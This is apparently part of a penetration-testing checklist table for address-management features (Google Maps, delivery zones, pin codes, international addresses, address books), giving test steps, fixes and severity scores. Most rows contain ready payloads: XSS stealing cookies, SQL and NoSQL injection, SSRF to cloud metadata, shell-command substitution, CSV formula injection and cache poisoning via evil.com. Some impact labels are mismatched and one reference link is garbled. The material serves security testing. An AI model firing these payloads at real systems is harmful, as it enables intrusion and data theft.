| ADDR-044 | Unrestricted Google Maps API Key Abuse | Security Misconfiguration (WSTG-CONF-01) | Google Maps Integration | 1. Extract the Google Maps API key from client-side code.<br>2. Use the key to make unauthorized API calls like Directions or Places or Geocoding.<br>3. Check if the key works without referrer restrictions. | Google Maps API key must be restricted to specific domains and APIs and usage must be monitored and capped. | <code>curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&amp;key=EXTRACTED_KEY'</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | cURL;Postman;KeyHacks | CWE-16; OWASP Security Misconfiguration (A05) |
| ADDR-045 | Google Maps JavaScript API XSS | Cross-Site Scripting (WSTG-INPV-02) | Google Maps Integration | 1. If custom markers or info windows use user-provided data inject XSS payloads.<br>2. Check if the payload renders in map info windows or popups. | Application must sanitize all user data before displaying it in Google Maps info windows or custom overlays. | <code>Set address_label=&lt;img src=x onerror=alert(document.cookie)&gt; and check if it renders in map marker popup</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-046 | SSRF via Maps Proxy Endpoint | SSRF (WSTG-INPV-19) | Google Maps Integration | 1. If the application proxies Google Maps requests through its own server intercept the proxy request.<br>2. Modify the destination URL to an internal service.<br>3. Check for SSRF. | Application must validate and whitelist URLs when proxying map requests and block access to internal networks. | <code>Change /api/maps/proxy?url=https://maps.googleapis.com/... to url=http://169.254.169.254/latest/meta-data/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADDR-047 | Maps Callback Injection | Injection (WSTG-INPV-01) | Google Maps Integration | 1. If Google Maps API uses a callback parameter inject JavaScript code.<br>2. Check if the callback value is reflected without sanitization. | Application must validate callback function names against a whitelist and reject any containing special characters. | <code>callback=alert(1)// or callback=eval(atob('payload')) in maps API callback parameter</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-048 | Clickjacking on Map Interface | Clickjacking (WSTG-CLNT-09) | Google Maps Integration | 1. Create a page that iframes the application's map page.<br>2. Overlay invisible elements to capture user clicks.<br>3. Check if the map page can be framed and interacted with. | Application must implement X-Frame-Options and CSP frame-ancestors to prevent the map interface from being framed. | <code>&lt;iframe src='https://target.com/address/map' style='opacity:0.1;position:absolute'&gt;&lt;/iframe&gt;</code> | Clickjacking of a sensitive action -&gt; UI-redress-driven state change. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser | CWE-1021; [CSRF kit](#/checklist/csrf); OWASP Clickjacking; PortSwigger |
| ADDR-049 | Map Data Injection for Address Spoofing | Business Logic (WSTG-BUSL-01) | Google Maps Integration | 1. Use the map to select a delivery address.<br>2. Intercept the coordinates sent to the server.<br>3. Modify coordinates to a different location while keeping the displayed address.<br>4. Check if the spoofed coordinates are accepted. | Application must reverse-geocode submitted coordinates server-side and validate them against the provided text address. | <code>Change lat=40.7128&amp;lng=-74.0060 to lat=0.0&amp;lng=0.0 while keeping text_address as New York address</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-050 | Information Leakage via Maps API Calls | Information Disclosure (WSTG-INFO-05) | Google Maps Integration | 1. Monitor all Google Maps API calls made by the application.<br>2. Check if sensitive user data like exact home location or search history is sent to Google.<br>3. Review query parameters. | Application must minimize data shared with third-party map services and inform users about data sharing practices. | <code>Monitor network requests to maps.googleapis.com for user-identifiable data in parameters</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-051 | Type Manipulation to Bypass Restrictions | Business Logic (WSTG-BUSL-01) | Multiple Address Types (Home/Work) | 1. Add an address with type=home.<br>2. Intercept the request and change address_type to a non-standard value like admin or warehouse or internal.<br>3. Check if the application accepts it. | Application must validate address_type against a predefined whitelist of allowed types. | <code>Change address_type=home to address_type=admin or address_type=warehouse or address_type=internal</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-052 | Exceeding Maximum Address Count Per Type | Business Logic (WSTG-BUSL-05) | Multiple Address Types (Home/Work) | 1. Check if there is a limit on addresses per type.<br>2. Add more addresses than allowed for a single type.<br>3. Bypass frontend limits via API.<br>4. Check for storage abuse. | Application must enforce maximum address count limits per type server-side. | <code>Send 100+ POST /api/addresses requests all with address_type=home via API bypassing UI limit</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-840; PortSwigger Business logic |
| ADDR-053 | SQL Injection in Address Type Filter | Injection (WSTG-INPV-05) | Multiple Address Types (Home/Work) | 1. Use the filter to view addresses by type.<br>2. Inject SQL payload in the type parameter.<br>3. Observe the response for SQL errors or data leakage. | Application must use parameterized queries for filtering addresses by type. | <code>GET /api/addresses?type=' OR 1=1--;GET /api/addresses?type=home' UNION SELECT &#42; FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-054 | XSS via Custom Address Type Label | Cross-Site Scripting (WSTG-INPV-02) | Multiple Address Types (Home/Work) | 1. If users can create custom address type labels inject XSS payload as the label.<br>2. Save and view the address list.<br>3. Check if the payload executes. | Application must sanitize custom address type labels and encode output when rendering. | <code>address_type=&lt;script&gt;alert('XSS')&lt;/script&gt; or address_label=&lt;img/src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-055 | IDOR on Viewing Specific Address Type for Another User | Broken Access Control (WSTG-AUTHZ-04) | Multiple Address Types (Home/Work) | 1. Filter addresses by type for own account.<br>2. Change user_id parameter to another user.<br>3. Check if another user's home or work addresses are disclosed. | Application must verify ownership before returning any address data regardless of filter criteria. | <code>GET /api/addresses?user_id=1002&amp;type=home using User A authentication</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-056 | Address Type Change Without Authorization | Broken Access Control (WSTG-AUTHZ-02) | Multiple Address Types (Home/Work) | 1. Change the type of an existing address from home to work.<br>2. Intercept and modify the address_id to another user's address.<br>3. Check if the type is changed for the other user. | Application must validate address ownership before allowing type changes. | <code>PUT /api/addresses/ADDR-2001/type with type=work using non-owner credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-057 | Delivery Zone Bypass via Coordinate Manipulation | Business Logic (WSTG-BUSL-01) | Delivery Zone Validation | 1. Select a delivery address outside the service zone.<br>2. Intercept the request and modify the coordinates or zone_id to a serviceable zone.<br>3. Check if delivery is accepted for the out-of-zone address. | Application must validate delivery zone eligibility server-side based on the actual address and not trust client-provided zone identifiers. | <code>Change zone_id=OUT_OF_ZONE to zone_id=SERVICEABLE or modify coordinates to within-zone values</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-058 | SQL Injection in Zone Lookup | Injection (WSTG-INPV-05) | Delivery Zone Validation | 1. Use the delivery zone validation endpoint.<br>2. Inject SQL payloads in the zip_code or zone_id parameter.<br>3. Observe for SQL errors or data leakage. | Application must use parameterized queries for all delivery zone database lookups. | <code>GET /api/delivery-zones/check?zip=' OR 1=1--;GET /api/delivery-zones?zone_id=1' UNION SELECT &#42; FROM zones--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-059 | Zone Validation Bypass for Free Delivery | Business Logic (WSTG-BUSL-01) | Delivery Zone Validation | 1. Check if certain zones have free delivery.<br>2. Intercept the zone validation response.<br>3. Change zone classification from paid to free.<br>4. Check if free delivery is applied. | Application must determine delivery fees server-side based on validated zone data and not accept client-modified zone classifications. | <code>Intercept response and change {"zone":"paid_delivery";"fee":9.99} to {"zone":"free_delivery";"fee":0}</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite | CWE-840; PortSwigger Business logic |
| ADDR-060 | Delivery Zone Enumeration | Information Disclosure (WSTG-INFO-04) | Delivery Zone Validation | 1. Send requests with various zip codes or zone identifiers.<br>2. Note differences in responses for valid vs invalid zones.<br>3. Enumerate all serviceable zones. | Application must not reveal detailed zone configuration information through validation responses. | <code>Enumerate GET /api/delivery-zones/check?zip=00001 through zip=99999 and map serviceable areas</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| ADDR-061 | Zone Restriction Bypass for Restricted Products | Business Logic (WSTG-BUSL-02) | Delivery Zone Validation | 1. Order a product restricted to certain delivery zones.<br>2. Intercept the order request and change the delivery zone to an allowed zone.<br>3. Change shipping address back to restricted zone after validation. | Application must validate zone restrictions at every stage including final order processing not just initial validation. | <code>Pass zone validation with allowed zone then modify shipping address to restricted zone before final submit</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-062 | Rate Limiting on Zone Validation Endpoint | Business Logic (WSTG-BUSL-05) | Delivery Zone Validation | 1. Send rapid zone validation requests with different addresses.<br>2. Check if rate limiting is enforced.<br>3. Attempt to map entire delivery zone coverage. | Application must implement rate limiting on zone validation to prevent abuse and data scraping. | <code>Send 500+ GET /api/delivery-zones/check requests per minute with varying zip codes</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| ADDR-063 | Cross-Zone Pricing Exploitation | Business Logic (WSTG-BUSL-01) | Delivery Zone Validation | 1. Get pricing for delivery in zone A.<br>2. Change zone to zone B which has lower delivery fees.<br>3. Submit order with zone B pricing but zone A address. | Application must recalculate delivery fees based on the actual validated address at order confirmation. | <code>Get delivery_fee from zone B then submit order with zone A address keeping zone B fee</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-064 | SQL Injection in Pin Code Lookup | Injection (WSTG-INPV-05) | Pin Code / Zip Code Lookup | 1. Use the pin code lookup feature.<br>2. Inject SQL payloads in the pin_code or zip_code parameter.<br>3. Observe the response for SQL errors or data extraction. | Application must use parameterized queries for all pin code and zip code database lookups. | <code>GET /api/pincode/lookup?code=' OR 1=1--;GET /api/zipcode?zip=12345' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-065 | XSS via Pin Code Lookup Response | Cross-Site Scripting (WSTG-INPV-02) | Pin Code / Zip Code Lookup | 1. Enter a pin code in the lookup field.<br>2. If the response includes the input in the page check for reflected XSS.<br>3. Inject XSS payload as the pin code value. | Application must encode all reflected values in pin code lookup responses to prevent XSS. | <code>pincode=&lt;script&gt;alert(1)&lt;/script&gt; or zip="&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-066 | Pin Code Enumeration for Location Mapping | Information Disclosure (WSTG-INFO-04) | Pin Code / Zip Code Lookup | 1. Enumerate all pin codes via the lookup API.<br>2. Map the responses to build a database of serviceable areas.<br>3. Check if sensitive location details are exposed. | Application must rate-limit pin code lookups and not expose sensitive information like exact delivery capabilities per zone. | <code>Enumerate GET /api/pincode/lookup?code=100001 through code=999999</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| ADDR-067 | Invalid Pin Code Format Handling | Input Validation (WSTG-INPV-01) | Pin Code / Zip Code Lookup | 1. Enter various invalid formats in pin code field like alphabets or special characters or negative numbers or extremely long values.<br>2. Check for error disclosure or crashes. | Application must validate pin code format server-side against expected patterns and return user-friendly error messages. | <code>zip=ABCDEF;zip=-12345;zip=12345678901234567890;zip=!@#$%^;zip=null;zip=undefined</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-068 | SSRF via Pin Code Validation Service | SSRF (WSTG-INPV-19) | Pin Code / Zip Code Lookup | 1. If pin code validation calls an external service intercept the request.<br>2. Modify the service URL if controllable.<br>3. Check for SSRF to internal systems. | Application must hardcode validation service URLs and not allow client-side manipulation of the service endpoint. | <code>Change validation_service_url to http://localhost:6379/ or http://internal-api.local/admin</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADDR-069 | Rate Limiting Bypass on Lookup | Business Logic (WSTG-BUSL-05) | Pin Code / Zip Code Lookup | 1. Send rapid pin code lookup requests.<br>2. If rate limited try bypassing with X-Forwarded-For or X-Real-IP header manipulation.<br>3. Check if bypass works. | Application must implement rate limiting that cannot be bypassed via header manipulation. | <code>Add X-Forwarded-For: 1.2.3.{1-255} to bypass IP-based rate limiting on /api/pincode/lookup</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| ADDR-070 | Pin Code Lookup Information Disclosure | Information Disclosure (WSTG-INFO-05) | Pin Code / Zip Code Lookup | 1. Perform pin code lookup and examine the full API response.<br>2. Check for excessive data exposure like warehouse locations or delivery partner details or internal zone codes. | Application must return only necessary information in pin code lookup responses without exposing internal operational data. | <code>Check response for fields like warehouse_id;delivery_partner;internal_zone;capacity;manager_contact</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-071 | NoSQL Injection in Pin Code Lookup | Injection (WSTG-INPV-05) | Pin Code / Zip Code Lookup | 1. If backend uses NoSQL inject NoSQL operators in the pin code parameter.<br>2. Check for data extraction or authentication bypass. | Application must sanitize pin code inputs against NoSQL injection patterns. | <code>GET /api/pincode/lookup?code[$ne]=null or code[$gt]=000000 or code[$regex]=.&#42;</code> | NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;NoSQLMap | CWE-943; [No[SQLi kit](#/checklist/sqli)](#/checklist/nosqli); PortSwigger NoSQL injection |
| ADDR-072 | Cache Poisoning via Pin Code Lookup | Caching (WSTG-ATHN-06) | Pin Code / Zip Code Lookup | 1. Send pin code lookup request with manipulated headers to poison cache.<br>2. Check if subsequent users receive the poisoned response.<br>3. Test with X-Forwarded-Host or custom headers. | Application must not cache responses based on user-controllable headers and must implement proper cache key validation. | <code>Add X-Forwarded-Host: evil.com to GET /api/pincode/lookup?code=10001 and check if cached response is poisoned</code> | Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-524; [Web Cache kit](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception |
| ADDR-073 | Unicode and IDN Injection in Address Fields | Input Validation (WSTG-INPV-01) | International Address Support | 1. Enter addresses with Unicode characters and internationalized domain names in fields.<br>2. Include right-to-left override characters and homoglyph attacks.<br>3. Check for rendering issues or injection. | Application must properly handle Unicode input and normalize characters to prevent homoglyph attacks and rendering manipulation. | <code>street=123 Маіn St (Cyrillic а і);city=Tеst (Cyrillic е);use RTL override U+202E in address fields</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-074 | Country Code Manipulation for Tax Avoidance | Business Logic (WSTG-BUSL-01) | International Address Support | 1. Add an international address.<br>2. Intercept the request and change country_code to a tax-haven country.<br>3. Check if tax calculation changes based on client-provided country code. | Application must validate country code against the actual address and recalculate taxes server-side using the verified address. | <code>Change country_code=US to country_code=BM (Bermuda) or country_code=KY (Cayman Islands) while keeping US address</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-075 | International Address Format Exploitation | Input Validation (WSTG-INPV-01) | International Address Support | 1. Enter addresses in various international formats with different field structures.<br>2. Test with formats that have extra fields or missing expected fields.<br>3. Check for validation bypass. | Application must support international address formats while maintaining proper validation for each country format. | <code>Submit Japanese address format to US address validator;submit address with postal_code in wrong field position</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-076 | SQL Injection via International Characters | Injection (WSTG-INPV-05) | International Address Support | 1. Use international character sets to obfuscate SQL injection payloads.<br>2. Use fullwidth or Unicode equivalents of SQL keywords.<br>3. Submit and check for injection. | Application must normalize Unicode input before validation and use parameterized queries regardless of character encoding. | <code>street=123 Ｍain' ＯＲ １＝１-- (fullwidth chars);city=Test＇ ＵＮＩＯＮ ＳＥＬＥＣＴ</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-077 | Character Encoding Bypass for XSS | Cross-Site Scripting (WSTG-INPV-02) | International Address Support | 1. Enter address fields with XSS payloads encoded in different character sets like UTF-7 or UTF-16 or ISO-2022-JP.<br>2. Check if encoding bypass allows script execution. | Application must enforce consistent character encoding (UTF-8) and sanitize inputs after decoding. | <code>street=+ADw-script+AD4-alert(1)+ADw-/script+AD4- (UTF-7);city=%uff1cscript%uff1ealert(1)%uff1c/script%uff1e</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-078 | Country Restriction Bypass for Sanctioned Countries | Business Logic (WSTG-BUSL-02) | International Address Support | 1. Attempt to add an address in a sanctioned or restricted country.<br>2. Bypass frontend country restrictions by submitting via API.<br>3. Check if the restricted country address is accepted. | Application must validate country restrictions server-side and reject addresses in sanctioned or restricted countries. | <code>POST /api/addresses with country_code of sanctioned country directly via API bypassing frontend dropdown</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-079 | Currency Mismatch via International Address | Business Logic (WSTG-BUSL-01) | International Address Support | 1. Add an international address in a different currency region.<br>2. Intercept the order request and force currency to the cheaper region.<br>3. Check if pricing exploits the currency mismatch. | Application must determine currency based on server-validated address and not accept client-specified currency for international orders. | <code>Set shipping_country=IN (India) and force currency=INR for items priced lower in INR</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-080 | Phone Number Format Injection in International Addresses | Injection (WSTG-INPV-01) | International Address Support | 1. Enter international phone numbers with injection payloads.<br>2. Include country calling codes with special characters.<br>3. Check for SMS injection or command injection. | Application must validate international phone number formats strictly and sanitize all phone input before processing. | <code>phone=+1234567890;+0987654321;phone=+1' OR 1=1--;phone=+1$(whoami)</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-081 | Address Transliteration Manipulation | Business Logic (WSTG-BUSL-01) | International Address Support | 1. Enter address in non-Latin script.<br>2. Check if the application transliterates or translates the address.<br>3. Manipulate the transliteration to create a different valid address. | Application must use verified transliteration services and validate transliterated addresses against original input. | <code>Enter address in Chinese characters that transliterates to a different physical location</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Manual Testing | CWE-840; PortSwigger Business logic |
| ADDR-082 | IDOR on Accessing Another User's Address Book | Broken Access Control (WSTG-AUTHZ-04) | Address Book Management | 1. Access own address book via API.<br>2. Intercept the request and change user_id to another user.<br>3. Check if the entire address book of another user is returned. | Application must strictly enforce that users can only access their own address book. | <code>Change GET /api/users/1001/address-book to GET /api/users/1002/address-book</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-083 | Bulk Export of Address Book Data | Information Disclosure (WSTG-INFO-05) | Address Book Management | 1. Check if address book has an export feature.<br>2. Attempt to export address book data.<br>3. Modify the user_id to download other users' address books.<br>4. Check for excessive data in export. | Application must restrict export functionality to authenticated user's own data and enforce authorization checks. | <code>GET /api/address-book/export?user_id=1002 with User A credentials or GET /api/admin/address-books/export</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-084 | Address Book Search SQL Injection | Injection (WSTG-INPV-05) | Address Book Management | 1. Use the address book search functionality.<br>2. Inject SQL payloads in the search query parameter.<br>3. Observe the response for data leakage or errors. | Application must use parameterized queries for address book search operations. | <code>GET /api/address-book/search?q=' OR 1=1--;GET /api/address-book?search=test' UNION SELECT email;password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-085 | Unauthorized Sharing of Address Book | Broken Access Control (WSTG-AUTHZ-02) | Address Book Management | 1. If address sharing exists attempt to share address book with unauthorized users.<br>2. Try to access shared address books without proper authorization.<br>3. Check sharing permissions. | Application must enforce explicit authorization for address sharing and validate permissions on every access. | <code>POST /api/address-book/share with target_user_id=1002 without their consent;access shared books without auth</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-086 | Address Book Import Malicious File Upload | File Upload (WSTG-INPV-12) | Address Book Management | 1. If address book import from CSV or vCard is supported upload a malicious file.<br>2. Inject formulas or scripts in CSV or malicious vCard content.<br>3. Check for code execution or SSRF. | Application must validate and sanitize all imported address data and restrict file types and content. | <code>Upload CSV with =cmd&#124;'/C calc'!A0 formula injection;upload vCard with SSRF URLs or XSS in fields</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Files | CWE-434; [File Upload kit](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| ADDR-087 | XSS via Imported Address Data | Cross-Site Scripting (WSTG-INPV-02) | Address Book Management | 1. Import addresses containing XSS payloads in name or address fields from a CSV or vCard file.<br>2. View the imported addresses in the address book.<br>3. Check if scripts execute. | Application must sanitize all imported data fields before storage and encode output when rendering. | <code>Import CSV: Name;Address with row &lt;script&gt;alert(1)&lt;/script&gt;;123 &lt;img src=x onerror=alert(1)&gt; St</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
